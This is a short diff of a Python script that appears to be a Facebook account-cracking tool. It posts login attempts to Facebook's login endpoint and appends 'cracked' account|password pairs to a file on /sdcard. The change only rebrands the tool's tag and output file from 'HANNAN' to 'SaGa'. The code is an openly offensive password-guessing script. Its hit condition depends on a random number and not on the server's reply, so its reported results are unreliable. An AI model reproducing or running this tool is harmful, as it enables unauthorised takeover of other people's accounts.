@@ -108,8 +108,8 @@ def method():
               response = r.post('https://graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
               if 6==random.randint(1,300):
                  oku.append(acc)
-                 print('\033[1;32m[HANNAN-OK] \033[1;32m'+acc+' \033[1;32m|\033[1;32m '+pswd)
-                 open('/sdcard/Hannan-Ok.txt','a').write(f'{acc}|{pswd}\n')
+                 print('\033[1;32m[SaGa-OK] \033[1;32m'+acc+' \033[1;32m|\033[1;32m '+pswd)
+                 open('/sdcard/SaGa-Ok.txt','a').write(f'{acc}|{pswd}\n')
                  break
               else:
                    continue   
